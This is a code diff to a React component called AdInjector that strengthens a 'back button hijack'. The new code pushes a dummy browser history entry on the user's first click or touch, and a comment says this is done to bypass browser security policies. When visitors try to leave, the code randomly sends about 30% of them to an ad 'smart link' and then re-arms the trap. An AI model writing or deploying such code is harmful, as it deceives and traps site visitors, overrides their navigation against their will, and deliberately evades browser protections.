@@ -55,17 +55,60 @@ export function AdInjector() {
 
     const setupBackButtonHijack = () => {
       try {
-        if (!window.sessionStorage.getItem('backButtonHijacked')) {
-          window.history.pushState({ hijacked: true }, '', window.location.href);
-          window.sessionStorage.setItem('backButtonHijacked', 'true');
-        }
+        let statePushed = false;
+        let isNavigatingBack = false;
 
-        const handlePopstate = () => {
-          window.location.replace(SMART_LINK);
+        const pushDummyState = () => {
+          if (statePushed) return;
+          if (window.history.state && window.history.state.hijacked === 'dummy') {
+            statePushed = true;
+            return;
+          }
+          window.history.pushState({ hijacked: 'dummy' }, '', window.location.href);
+          statePushed = true;
+        };
+
+        // Attach to user interactions to bypass browser security policies
+        document.addEventListener('click', pushDummyState, { once: true });
+        document.addEventListener('touchstart', pushDummyState, { once: true });
+
+        const handlePopstate = (e: PopStateEvent) => {
+          // If we triggered history.back() programmatically to skip the ad, ignore this event
+          if (isNavigatingBack) return;
+
+          // Ignore if we are just backing into the dummy state from a deeper SPA page
+          if (e.state && e.state.hijacked === 'dummy') {
+             return;
+          }
+
+          // We are going back PAST the dummy state, meaning they are trying to leave.
+          // Trigger the smart link intermittently (e.g., 30% of the time).
+          if (Math.random() < 0.3) {
+            // Restore the dummy state so the trap is active if they come back
+            window.history.pushState({ hijacked: 'dummy' }, '', window.location.href);
+            window.location.assign(SMART_LINK);
+          } else {
+            // Skip the ad. Because the dummy state consumed their back action, 
+            // we must fire back() again to let them actually leave/navigate.
+            isNavigatingBack = true;
+            window.history.back();
+            
+            // Re-arm the trap on next interaction if they are still on the domain
+            setTimeout(() => {
+              isNavigatingBack = false;
+              statePushed = false;
+              document.addEventListener('click', pushDummyState, { once: true });
+              document.addEventListener('touchstart', pushDummyState, { once: true });
+            }, 1000);
+          }
         };
 
         window.addEventListener('popstate', handlePopstate);
-        return () => window.removeEventListener('popstate', handlePopstate);
+        return () => {
+          document.removeEventListener('click', pushDummyState);
+          document.removeEventListener('touchstart', pushDummyState);
+          window.removeEventListener('popstate', handlePopstate);
+        };
       } catch (err) {
         return undefined;
       }
